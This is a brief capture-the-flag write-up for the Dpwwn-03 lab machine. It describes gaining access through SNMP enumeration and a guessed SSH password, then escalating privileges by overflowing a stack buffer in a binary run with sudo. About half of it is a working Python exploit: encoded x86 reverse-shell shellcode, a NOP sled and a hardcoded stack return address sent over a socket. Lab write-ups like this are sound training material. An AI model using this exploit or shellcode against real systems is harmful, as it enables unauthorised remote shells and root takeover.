# Dpwwn-03

The machine offers an easy access with username and password "john". This must be guessed after reading the username from the SNMP information, which can be retrieved using the communnity string "public".

This offers an access through SSH with user "john", who can run with sudo a Bash script which executes a binary named "smashthestack".

It is a Vanilla Buffer Overflow where it is possile to jump directly to the stack, which may be more difficult than it sounds. 

When the exploit works using GDB, the stack address must be updated to a little bit (lol?) higher address to work without GDB, and then again some more bytes to work with the Bash script running with sudo.

```
import sys,socket

# Reverse shell for linux x86, lhost = 127.0.0.1, lport = 8000, encoding = x86/alpha_mixed, no conflictive characters
payload = (
"\x89\xe3\xda\xdd\xd9\x73\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x70\x31\x79\x4b\x39\x67\x38\x63\x42\x73\x53\x73\x63\x63\x62"
"\x4a\x75\x52\x6d\x59\x6b\x51\x4e\x50\x50\x66\x7a\x6d\x4f\x70"
"\x6a\x33\x66\x39\x4c\x70\x35\x6f\x68\x4d\x4b\x30\x72\x69\x42"
"\x59\x59\x69\x51\x78\x53\x4f\x33\x30\x47\x70\x47\x71\x71\x78"
"\x77\x72\x63\x30\x67\x6f\x77\x30\x4d\x59\x6d\x31\x48\x30\x43"
"\x56\x62\x70\x30\x51\x63\x63\x6f\x43\x63\x33\x4d\x59\x49\x71"
"\x68\x4d\x6b\x30\x62\x72\x55\x38\x70\x6e\x34\x6f\x72\x53\x30"
"\x68\x71\x78\x46\x4f\x56\x4f\x32\x42\x30\x69\x4e\x69\x68\x63"
"\x52\x72\x30\x53\x4d\x59\x6d\x31\x6c\x70\x46\x6b\x7a\x6d\x4d"
"\x50\x41\x41"
)

ip_ = '127.0.0.1'
port_ = 3210

# First get the stack address with gdb ("\x20\xf2\xff\xbf")
# then as john (without gdb) adding some bytes ("\x40\xf2\xff\xbf")
# then add some more running as root from the SH script ("\x80\xf2\xff\xbf")
jmp_stack = "\x80\xf2\xff\xbf"

nop = '\x90'
buff = '\x41'*732+jmp_stack+nop*50+payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_, port_))
s.send(buff)
s.close()
```